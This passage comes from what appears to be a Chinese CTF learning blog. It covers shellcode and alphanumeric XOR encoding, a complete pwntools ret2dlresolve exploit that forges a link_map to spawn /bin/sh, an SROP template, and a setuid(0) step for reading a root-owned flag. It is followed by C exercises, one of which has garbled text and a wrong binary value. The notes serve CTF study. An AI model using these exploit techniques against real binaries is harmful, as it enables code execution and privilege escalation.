+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov rax, <span class="number">0</span></span><br><span class="line">mov rdi, <span class="number">0</span></span><br><span class="line">mov rsi, <span class="number">0x88888888</span></span><br><span class="line">mov rdi, <span class="number">0x100</span></span><br><span class="line">syscall    </span><br></pre></td></tr></table></figure>
+
+<p>当程序能执行以上的指令后便可以调用read函数向0x88888888的地方读取0x100的数据，</p>
+<p>对于写好的汇编指令要注入到程序中必须换为机器码才能注入到程序中，可以通过以下的网站换为机器码</p>
+<p>[Online Assembler and Disassembler (shell-storm.org)](<a target="_blank" rel="noopener" href="https://shell-storm.org/online/Online-Assembler-and-Disassembler/?inst=">https://shell-storm.org/online/Online-Assembler-and-Disassembler/?inst=</a> &amp;arch&#x3D;x86-64&amp;as_format&#x3D;inline#assembly)</p>
+<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240317085245419.png" alt="image-20240317085245419"></p>
+<p>对于已知机器码要想换为ascll可以通过以下网站实现</p>
+<p><a target="_blank" rel="noopener" href="https://www.bchrt.com/tools/ascii-converter/">ASCII、十六进制、二进制、十进制、Base64转换器 (bchrt.com)</a></p>
+<p>但是在很多情况下我们要注入的shellcode是有限制的，有的时候只能输入规定的值如大写字母和数字，像这种情况变要将写的shellcode从16进制的数转为为ascll码的值，如在ascll中A代表41，那么当我们向程序输入A，在程序内部便会存放41如果程序在能执行到这时，便回将那个41当成机器码执行，在ascll码中不同的数相对应的汇编可以在以下的网站中找到</p>
+<p><a target="_blank" rel="noopener" href="https://nets.ec/Alphanumeric_shellcode">Alphanumeric shellcode - NetSec</a></p>
+<p>对于限制输入的时候可以通过异或的操作将输入的数转换为需要的数，这里给一个异或的py脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_operation_case1</span>():</span><br><span class="line">    original_num = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入原数（16进制）：&quot;</span>), <span class="number">16</span>)</span><br><span class="line">    xor_num = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入要对原数进行异或的数（16进制）：&quot;</span>), <span class="number">16</span>)</span><br><span class="line">    </span><br><span class="line">    result = original_num ^ xor_num</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;异或的结果：&quot;</span>, <span class="built_in">hex</span>(result))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;原数的二进制表示：&quot;</span>, <span class="built_in">bin</span>(original_num))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;对原数进行异或的数的二进制表示：&quot;</span>, <span class="built_in">bin</span>(xor_num))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;异或的结果的二进制表示：&quot;</span>, <span class="built_in">bin</span>(result))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_operation_case2</span>():</span><br><span class="line">    original_num = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入原数（16进制）：&quot;</span>), <span class="number">16</span>)</span><br><span class="line">    xor_result = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入异或的结果（16进制）：&quot;</span>), <span class="number">16</span>)</span><br><span class="line">    </span><br><span class="line">    xor_num = original_num ^ xor_result</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;对原数进行异或的数：&quot;</span>, <span class="built_in">hex</span>(xor_num))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;原数的二进制表示：&quot;</span>, <span class="built_in">bin</span>(original_num))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;对原数进行异或的数的二进制表示：&quot;</span>, <span class="built_in">bin</span>(xor_num))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;异或的结果的二进制表示：&quot;</span>, <span class="built_in">bin</span>(xor_result))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    choice = <span class="built_in">input</span>(<span class="string">&quot;请选择操作：\n1. 知道原数和要对原数进行异或的数求异或的结果；\n2. 知道异或的结果和原数求要对原数进行异或的数（输入1或2）；\n输入 &#x27;exit&#x27; 退出：\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> choice == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        xor_operation_case1()</span><br><span class="line">    <span class="keyword">elif</span> choice == <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">        xor_operation_case2()</span><br><span class="line">    <span class="keyword">elif</span> choice.lower() == <span class="string">&#x27;exit&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;程序已退出。&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;无效的选择。&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p><strong>ret2dlresolve类题</strong></p>
+<p>关于这类题目现将一般做题方法写下来，具体的原理等看看视频在回来补</p>
+<p>须知道read函数的plt和got的地址</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eof = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">read_plt = eof.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_got = eof.got[<span class="string">&#x27;read&#x27;</span>]</span><br></pre></td></tr></table></figure>
+
+<p>plt表的头地址和这个地址+7或其它的数</p>
+<p>bss段的空地址，这个空地址可能需要两个</p>
+<p>rdi和rsi寄存器的修改地(如果只修改rsi的没有同时修改rsi和r15的也行，r15一直被修改为0就行)</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">plt0=<span class="number">0x401020</span></span><br><span class="line">plt_load =p64(plt0+<span class="number">7</span>)</span><br><span class="line">bss=<span class="number">0x404040</span>    </span><br><span class="line">bss_stage =bss + <span class="number">0x100</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x88888888</span>    </span><br><span class="line">pop_rsi_ret=<span class="number">0x88888888</span></span><br></pre></td></tr></table></figure>
+
+<p>还需知道在基本库中函数system和read的地址以及他们两个的差值</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">libc = ELF(<span class="string">&#x27;/usr/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">system_libc=libc.sym[<span class="string">&#x27;system&#x27;</span>]    </span><br><span class="line">read_libc=libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">l_addr =libc.sym[<span class="string">&#x27;system&#x27;</span>] -libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br></pre></td></tr></table></figure>
+
+<p>在此之后便可以开始构建其中最重要的基本过程，可以通过以下函数直接构成</p>
+<p>其中的第一个需要输入的参数fake_linkmap_add，便是之前找的bss段的空地址，但最好用第二，第一个需要在之后用于存放这一段命令，bss_stage</p>
+<p>第二个参数known_func_ptr，便是已知的程序中的read函数的got表的地址，read_got</p>
+<p>第三个参数offset，便是库函数中system和read的地址以及他们两个的差值，l_addr</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fake_Linkmap_payload</span>(<span class="params">fake_linkmap_addr,known_func_ptr,offset</span>):</span><br><span class="line">	linkmap = p64(offset &amp; (<span class="number">2</span> ** <span class="number">64</span> - <span class="number">1</span>))<span class="comment">#l_addr</span></span><br><span class="line">	linkmap += p64(<span class="number">0</span>)</span><br><span class="line">	linkmap += p64(fake_linkmap_addr + <span class="number">0x18</span>)</span><br><span class="line">	linkmap += p64((fake_linkmap_addr + <span class="number">0x30</span> - offset) &amp; (<span class="number">2</span> ** <span class="number">64</span> - <span class="number">1</span>))</span><br><span class="line">	linkmap += p64(<span class="number">0x7</span>)</span><br><span class="line">	linkmap += p64(<span class="number">0</span>)</span><br><span class="line">	linkmap += p64(<span class="number">0</span>)</span><br><span class="line">	linkmap += p64(<span class="number">0</span>)</span><br><span class="line">	linkmap += p64(known_func_ptr - <span class="number">0x8</span>)</span><br><span class="line">	linkmap += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">	linkmap = linkmap.ljust(<span class="number">0x68</span>,<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">	linkmap += p64(fake_linkmap_addr)</span><br><span class="line">	linkmap += p64(fake_linkmap_addr + <span class="number">0x38</span>)</span><br><span class="line">	linkmap = linkmap.ljust(<span class="number">0xf8</span>,<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">	linkmap += p64(fake_linkmap_addr + <span class="number">0x8</span>)</span><br><span class="line">	<span class="keyword">return</span> linkmap</span><br></pre></td></tr></table></figure>
+
+<p>现在便可以开始构建基本payload，和必要过程</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fake_link_map = fake_Linkmap_payload(bss_stage, read_got ,l_addr)</span><br><span class="line">    </span><br><span class="line">payload = flat( b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>*(栈溢出的垃圾值，rbp+<span class="number">8</span>) ,</span><br><span class="line">               pop_rdi, <span class="number">0</span> ,pop_rsi ,bss_stage ,read_plt<span class="comment">//调用read函数将fake_link_map写入bss</span></span><br><span class="line">			    ,pop_rsi ,<span class="number">0</span> ,pop_rdi ,bss_stage +<span class="number">0x48</span> ,plt_load ,bss_stage ,<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+<p>之后便可以直接发个程序了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(payload)</span><br><span class="line">p.send(fake_link_map)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>综合</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;amd64&quot;</span>, log_level= <span class="string">&quot;debug&quot;</span>)</span><br><span class="line"> </span><br><span class="line">p=process(<span class="string">&#x27;./pwn3&#x27;</span>)</span><br><span class="line"><span class="comment">#p =remote(&#x27;node4.buuoj.cn&#x27;,27108)</span></span><br><span class="line">eof = ELF(<span class="string">&#x27;./pwn3&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/usr/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">read_plt = eof.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_got = eof.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"><span class="comment">#vuln_addr = 0x401170</span></span><br><span class="line">plt0 = <span class="number">0x401020</span> <span class="comment">#plt段地址 </span></span><br><span class="line">bss = <span class="number">0x404040</span></span><br><span class="line">bss_stage =bss + <span class="number">0x00</span></span><br><span class="line">l_addr =libc.sym[<span class="string">&#x27;system&#x27;</span>] -libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"> </span><br><span class="line">pop_rdi = <span class="number">0x000000000040115e</span>    <span class="comment">#pop rdi ; ret</span></span><br><span class="line">pop_rsi = <span class="number">0x0000000000401231</span>    <span class="comment">#pop rsi ; ret#用于解析符号 dl_runtime_resolve  </span></span><br><span class="line">plt_load =p64(plt0+<span class="number">7</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fake_Linkmap_payload</span>(<span class="params">fake_linkmap_addr,known_func_ptr,offset</span>):</span><br><span class="line">	linkmap = p64(offset &amp; (<span class="number">2</span> ** <span class="number">64</span> - <span class="number">1</span>))<span class="comment">#l_addr</span></span><br><span class="line">	linkmap += p64(<span class="number">0</span>)</span><br><span class="line">	linkmap += p64(fake_linkmap_addr + <span class="number">0x18</span>)</span><br><span class="line">	linkmap += p64((fake_linkmap_addr + <span class="number">0x30</span> - offset) &amp; (<span class="number">2</span> ** <span class="number">64</span> - <span class="number">1</span>))</span><br><span class="line">	linkmap += p64(<span class="number">0x7</span>)</span><br><span class="line">	linkmap += p64(<span class="number">0</span>)</span><br><span class="line">	linkmap += p64(<span class="number">0</span>)</span><br><span class="line">	linkmap += p64(<span class="number">0</span>)</span><br><span class="line">	linkmap += p64(known_func_ptr - <span class="number">0x8</span>)</span><br><span class="line">	linkmap += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">	linkmap = linkmap.ljust(<span class="number">0x68</span>,<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">	linkmap += p64(fake_linkmap_addr)</span><br><span class="line">	linkmap += p64(fake_linkmap_addr + <span class="number">0x38</span>)</span><br><span class="line">	linkmap = linkmap.ljust(<span class="number">0xf8</span>,<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">	linkmap += p64(fake_linkmap_addr + <span class="number">0x8</span>)</span><br><span class="line">	<span class="keyword">return</span> linkmap</span><br><span class="line"> </span><br><span class="line">fake_link_map = fake_Linkmap_payload(bss_stage, read_got ,l_addr)</span><br><span class="line"> </span><br><span class="line">payload = flat( <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x78</span> ,pop_rdi, <span class="number">0</span> ,pop_rsi ,bss_stage ,<span class="number">0</span>,read_plt</span><br><span class="line">			    ,pop_rsi ,<span class="number">0</span> ,<span class="number">0</span>,pop_rdi ,bss_stage +<span class="number">0x48</span> ,plt_load ,bss_stage ,<span class="number">0</span>)</span><br><span class="line"> </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.send(fake_link_map)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p><strong>SROP</strong></p>
+<p>对于这种题一般有比较明显的特点，必然有通过syscall进行函数调用的地方而不是直接调用函数，</p>
+<p>对于像这种不用进行栈迁移的，在程序中有syscall函数调用的</p>
+<p>在一开始必须知道得有，rdi寄存器修改，bss段的空地址，plt段的syscall函数地址</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pop_rdi_ret=<span class="number">0x88888888</span></span><br><span class="line">bss=<span class="number">0x404040</span></span><br><span class="line">sysacll=<span class="number">0x8888888</span>    </span><br></pre></td></tr></table></figure>
+
+<p>对于srop的基本构造可以直接使用现成的工具构造，</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">frame=SigreturnFrame()</span><br><span class="line">frame.rdi =<span class="number">59</span></span><br><span class="line">frame.rsi =bss <span class="number">-0x30</span></span><br><span class="line">frame.rdx =<span class="number">0</span></span><br><span class="line">frame.rcx =<span class="number">0</span></span><br><span class="line">frame.rsp =bss</span><br><span class="line">frame.rip =syscall<span class="comment">//syscall在plt的地址</span></span><br></pre></td></tr></table></figure>
+
+<p>现在便可以开始构建payload，我们要分两次进行输入</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload=b<span class="number">&#x27;</span>A<span class="number">&#x27;</span>*(到rbp的距离)+p64(bss)+p64(能进行输入的函数的开始，以便第二段的输入)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;srop!\n&#x27;</span>,payload)</span><br><span class="line">    </span><br><span class="line">payload=b<span class="number">&#x27;</span>/bin/sh\x00<span class="number">&#x27;</span>+b<span class="number">&#x27;</span>A<span class="number">&#x27;</span>*（到rbp的距离）</span><br><span class="line">payload+=p64(pop_rdi_ret)+p64(<span class="number">15</span>)+p64(syscall)+flat(frame)<span class="comment">//将srop的基本参数输入</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+
+
+
+<p>在通过脚本拿到shell后发现flag不能读出来，发现pwn文件有s级权限，便可以可以用setuid函数执行0，从而获得权限读取flag，</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">elo=ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">setuid_libc=elo.symbols[<span class="string">&#x27;setuid&#x27;</span>]    </span><br><span class="line">setuid=setuid_libc+base_libc</span><br><span class="line">payload=flat(pop_rdi_ret,<span class="number">0</span>,stuid,用于拿到shell的过程)    </span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240325200803566.png" alt="image-20240325200803566"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://2023478.github.io/2024/03/27/%E5%8D%9A%E5%AE%A2/" data-id="clu9qle6l00020g7zf9dga89d" data-title="" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-C语言题目" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/03/26/C%E8%AF%AD%E8%A8%80%E9%A2%98%E7%9B%AE/" class="article-date">
+  <time class="dt-published" datetime="2024-03-26T13:22:41.000Z" itemprop="datePublished">2024-03-26</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2024/03/26/C%E8%AF%AD%E8%A8%80%E9%A2%98%E7%9B%AE/">My New Post</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <ol>
+<li><h4 id="编写一个-C-程序，创建一个整型数组，并通过用户输入初始化数组的元素。然后将数组的每个元素转换为二进制格式并输出。"><a href="#编写一个-C-程序，创建一个整型数组，并通过用户输入初始化数组的元素。然后将数组的每个元素转换为二进制格式并输出。" class="headerlink" title="编写一个 C 程序，创建一个整型数组，并通过用户输入初始化数组的元素。然后将数组的每个元素转换为二进制格式并输出。"></a>编写一个 C 程序，创建一个整型数组，并通过用户输入初始化数组的元素。然后将数组的每个元素转换为二进制格式并输出。</h4></li>
+</ol>
+<p>输入示例:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">5</span><br><span class="line">1 3 7 15 31</span><br></pre></td></tr></table></figure>
+
+<p>输出示例:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">yaml</span><br><span class="line">1: 1</span><br><span class="line">3: 11</span><br><span class="line">7: 111</span><br><span class="line">15: 1111</span><br><span class="line">31: 11111</span><br></pre></td></tr></table></figure>
+
+<p>2定义一个名为 <code>IntegerInfo</code> 的结构体，它包含两个成员变量，一个整型变量 <code>num</code> 用于存储整数，另一个字符串 <code>binary</code> 用于存储整数的二进制表示。编写一个函数，接受一个整数作为参数，返回一个 <code>IntegerInfo</code> 结构体，其中的 <code>num</code> 存储输入整数，<code>binary</code> 存储整数的二进制表示。</p>
+<p>输入示例:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5</span><br></pre></td></tr></table></figure>
+
+<p>输出示例:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">makefile</span><br><span class="line">num: 5</span><br><span class="line">binary: 101</span><br></pre></td></tr></table></figure>
+
+<h4 id="3编写一个-C-程序，定义一个一维整型数组，通过用户输入初始化数组的元素。然后编写一个函数，接受这个数组和一个整数-n-作为参数，返回一个新的数组，其中包含原数组中所有大于-n-的元素的二进制表示。"><a href="#3编写一个-C-程序，定义一个一维整型数组，通过用户输入初始化数组的元素。然后编写一个函数，接受这个数组和一个整数-n-作为参数，返回一个新的数组，其中包含原数组中所有大于-n-的元素的二进制表示。" class="headerlink" title="3编写一个 C 程序，定义一个一维整型数组，通过用户输入初始化数组的元素。然后编写一个函数，接受这个数组和一个整数 n 作为参数，返回一个新的数组，其中包含原数组中所有大于 n 的元素的二进制表示。"></a>3编写一个 C 程序，定义一个一维整型数组，通过用户输入初始化数组的元素。然后编写一个函数，接受这个数组和一个整数 <code>n</code> 作为参数，返回一个新的数组，其中包含原数组中所有大于 <code>n</code> 的元素的二进制表示。</h4><p>输入示例:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">5</span><br><span class="line">1 3 7 15 31</span><br><span class="line">7</span><br></pre></td></tr></table></figure>
+
+<p>输出示例:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yaml</span><br><span class="line">1111</span><br><span class="line">11111</span><br></pre></td></tr></table></figure>
+
+<h4 id="4定义一个名为-BinaryString-的结构体，包含一个字符串-str-用于存储二进制数字，和一个整型变量-length-用于存储字符串的长度。编写一个函数，ring-结构体数组中，最后返回这个数组。"><a href="#4定义一个名为-BinaryString-的结构体，包含一个字符串-str-用于存储二进制数字，和一个整型变量-length-用于存储字符串的长度。编写一个函数，ring-结构体数组中，最后返回这个数组。" class="headerlink" title="4定义一个名为 BinaryString 的结构体，包含一个字符串 str 用于存储二进制数字，和一个整型变量 length 用于存储字符串的长度。编写一个函数，ring&#96; 结构体数组中，最后返回这个数组。"></a>4定义一个名为 <code>BinaryString</code> 的结构体，包含一个字符串 <code>str</code> 用于存储二进制数字，和一个整型变量 <code>length</code> 用于存储字符串的长度。编写一个函数，ring&#96; 结构体数组中，最后返回这个数组。</h4><p>输入示例:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello</span><br></pre></td></tr></table></figure>
+
+<p>输出示例:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">makefile</span><br><span class="line">H: 1001000</span><br><span class="line">e: 1100101</span><br><span class="line">l: 1101100</span><br><span class="line">l: 1101100</span><br><span class="line">o: 1101111</span><br></pre></td></tr></table></figure>
+
+<h4 id="5编写一个-C-程序，定义一个结构体数组，每个结构体包含一个整型变量和一个字符串。通过用户输入初始化结构体数组的元素，然后编写一个函数，接受这个结构体数组和一个整数-n-作为参数，返回一个新的数组，其中包含原数组中所有整型变量大于-n-的结构体的字符串的二进制表示。"><a href="#5编写一个-C-程序，定义一个结构体数组，每个结构体包含一个整型变量和一个字符串。通过用户输入初始化结构体数组的元素，然后编写一个函数，接受这个结构体数组和一个整数-n-作为参数，返回一个新的数组，其中包含原数组中所有整型变量大于-n-的结构体的字符串的二进制表示。" class="headerlink" title="5编写一个 C 程序，定义一个结构体数组，每个结构体包含一个整型变量和一个字符串。通过用户输入初始化结构体数组的元素，然后编写一个函数，接受这个结构体数组和一个整数 n 作为参数，返回一个新的数组，其中包含原数组中所有整型变量大于 n 的结构体的字符串的二进制表示。"></a>5编写一个 C 程序，定义一个结构体数组，每个结构体包含一个整型变量和一个字符串。通过用户输入初始化结构体数组的元素，然后编写一个函数，接受这个结构体数组和一个整数 <code>n</code> 作为参数，返回一个新的数组，其中包含原数组中所有整型变量大于 <code>n</code> 的结构体的字符串的二进制表示。</h4><p>输入示例:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">1 Hello</span><br><span class="line">15 World</span><br><span class="line">31 Test</span><br><span class="line">20</span><br></pre></td></tr></table></figure>
+
+<p>输出示例:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">makefile</span><br><span class="line">World: 1010111 1101111 1140100 1100100 1100100</span><br><span class="line">Test: 1010100 1100101 1110011 1110100</span><br></pre></td></tr></table></figure>
+
+<h4 id="6编写一个-C-程序，定义一个名为-Array-的结构体，包含两个成员：一个整型指针-data-用于存储数组的元素，一个整型变量-length-用于存储数组的长度。使用动态内存分配创建一个-Array-结构体，并通过用户输入初始化结构体的成员。然后编写一个函数，使用指针操作，翻转数组中的元素，并输出翻转后的数组。"><a href="#6编写一个-C-程序，定义一个名为-Array-的结构体，包含两个成员：一个整型指针-data-用于存储数组的元素，一个整型变量-length-用于存储数组的长度。使用动态内存分配创建一个-Array-结构体，并通过用户输入初始化结构体的成员。然后编写一个函数，使用指针操作，翻转数组中的元素，并输出翻转后的数组。" class="headerlink" title="6编写一个 C 程序，定义一个名为 Array 的结构体，包含两个成员：一个整型指针 data 用于存储数组的元素，一个整型变量 length 用于存储数组的长度。使用动态内存分配创建一个 Array 结构体，并通过用户输入初始化结构体的成员。然后编写一个函数，使用指针操作，翻转数组中的元素，并输出翻转后的数组。"></a>6编写一个 C 程序，定义一个名为 <code>Array</code> 的结构体，包含两个成员：一个整型指针 <code>data</code> 用于存储数组的元素，一个整型变量 <code>length</code> 用于存储数组的长度。使用动态内存分配创建一个 <code>Array</code> 结构体，并通过用户输入初始化结构体的成员。然后编写一个函数，使用指针操作，翻转数组中的元素，并输出翻转后的数组。</h4><p>输入示例:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">5</span><br><span class="line">1 3 7 15 31</span><br></pre></td></tr></table></figure>
+
+<p>输出示例:</p>
